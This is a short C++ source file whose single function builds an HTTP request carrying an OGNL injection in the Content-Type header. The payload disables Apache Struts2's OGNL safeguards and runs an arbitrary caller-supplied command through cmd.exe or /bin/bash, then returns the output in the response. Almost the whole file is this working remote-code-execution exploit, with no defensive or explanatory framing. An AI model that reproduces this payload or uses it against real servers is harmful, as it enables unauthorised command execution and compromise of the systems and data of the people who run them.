#include "hdr.h"

string getPayload(string target, string cmd) {
    string payload = "GET /tseting/example/HelloWorld.action HTTP/1.1\r\nHost: " + target + "\r\ncmd: tseting\r\nContent-type: ";
    payload += "%{";
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).";
    payload += "(#_memberAccess?";
    payload += "(#_memberAccess=#dm):(";
    payload += "(#container=#context['com.opensymphony.xwork2.ActionContext.container']).";
    payload += "(#context['xwork.MethodAccessor.denyMethodExecution']=false).";
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).";
    payload += "(#ognlUtil.getExcludedPackageNames().clear()).";
    payload += "(#ognlUtil.getExcludedClasses().clear()).";
    payload += "(#context.setMemberAccess(#dm)))).";
    payload += "(#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win')).";
    payload += "(#p=new java.lang.ProcessBuilder(#iswin?{'cmd.exe', '/c', '" + cmd + "'}:{'/bin/bash', '-c', '" + cmd + "'})).";
    payload += "(#p.redirectErrorStream(true)).";
    payload += "(#process=#p.start()).";
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).";
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).";
    payload += "(#ros.flush()).";
    payload += "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('abc','abc'))";
    payload += "}";
    payload += "multipart/form-data";
    payload += "\r\n\r\n";
    return payload;
}